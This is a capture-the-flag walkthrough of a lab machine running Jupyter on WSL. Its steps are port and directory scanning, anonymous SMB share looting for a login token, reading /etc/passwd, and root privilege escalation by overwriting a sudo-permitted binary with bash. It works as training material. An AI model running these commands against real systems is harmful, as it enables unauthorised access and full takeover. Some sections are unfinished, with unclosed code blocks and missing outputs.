## INTRODUCTION

In this room, we explore jupyter Notebook and how we can leverage exposed login tokens to get a shell and privileges. What can passwordless shares lead to? Let us find out. Check it out here

## Initial recon - Port scanning

The first step is to conduct a port scan to identify open ports and the services that are running on those ports. Lets run nmap.

```shell
nmap -sC -sV 10.10.175.140 -o nmap.out
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 21:52 EAT

## Directory Scanning

We have some interesting services and since we have a http service on port `8888` we proceed to bruteforce for directories.
The second step is 
We then proceed to find points of entry.
Let's scan for directories using gobuster.
```shell
 gobuster dir -u http://10.10.175.140:8888/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
We discover some interseting directories.

```shell
gobuster dir -u http://10.10.175.140:8888/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

```

## Checking ot the Directories

There is a `/login`. This a point of entry since we can launch bruteforce attacks to got relevant credentials.
We have an input field but it wants a password token. We have to scoure the page for the token or means to achieve it.
The page source has nothing interesting.
So we go back to the services to check for other vulnerable services.



## SMB share enumeration

Port `445` is open and this means we can check it for smb shares. The share can enable us to access files, read and write data, and request services from a server.

For this task we use `smbclient`

```shell
smbclient -L 10.10.175.140 -p 445 -N --no-pass

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        datasci-team    Disk      
        IPC$            IPC       Remote IPC
```


`ADMIN$` and `C$` shares give us `tree connect failed: NT_STATUS_ACCESS_DENIED`.
The `IPC$` share successfully connect but nothing of interest there.
```shell
smbclient \\\\10.10.175.140\\IPC$ -N
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
```
We check out `datasci-team` share and there are interesting files here.

```shell
smbclient \\\\10.10.175.140\\datasci-team -N 
Try "help" to get a list of possible commands.
smb: \> ls

```


We cant read all these files here so we fetch them to our local machine.

To fetch all files without accepting each prompt, we use this command.

```shell
smbclient \\\\10.10.175.140\\datasci-team -N
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

This fetches all files to our local directory.

## Analyze files

The next step is to analyze each file individually.

In the `misc` directory there is a `txt` file with a token. 

```shell
cat jupyter-token.txt 
--------------------------
```

Now we can go back the login and use the token to access the page.

We are in!

After checking the page for anomalies, we find that there is dropdown menu that can power up a terminal.

```
This shows that the machine is opearating on a Windows Subsystem for Linux (WSL).

We check out the privileges `DATASCI-JUP` can run. We don't have the password, so let's checkout commands this user can execute as sudo and find ways to exploit it.

## SHELL

Let's check for a bash shell for `DATASCI-JUP` 

`cat /etc/passwd | grep  "bash"`

we can pop a shell in `/bin/bash`
```shell
(base) dev-datasci@DEV-DATASCI-JUP:~$ cat /etc/passwd | grep  "bash"
root:x:0:0:root:/root:/bin/bash
dev-datasci:x:1000:1000:,,,:/home/dev-datasci:/bin/bash
```


## Privilege Escalation
```shell
(base) dev-datasci@DEV-DATASCI-JUP:~$ sudo -l
Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev-datasci may run the following commands on DEV-DATASCI-JUP:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci -c *
```
This reveals a binary that does not require a password to execute.
We can exploit this.

GTFOBINS has nothing on this binary.

I found that we can copy the /bin/bash shell to our directory and pop a shell.

```shell
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ cp /bin/bash /home/dev-datasci/.local/bin/jupyter

(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ sudo /home/dev-datasci/.local/bin/jupyter
```
We are root!
```shell
root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# whoami
root
root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team#
```

As we had established before, this machine is opearating on a Windows Subsystem for Linux.

Change directory to `mnt` where the machine is mounted. `cd #mnt`

We successfully go to the `mnt` directory but  cannot do much here since the machine is not mounted.

To mount we use the mount -t drvfs 'c': /mnt/c

This command mounts the windows share on the WSL.

we the change directory into the C directory. `cd c` or `cd /mnt/c`

```shell
root@DEV-DATASCI-JUP:/# cd /mnt/c
```

We navigate the directory for the user and root flag.
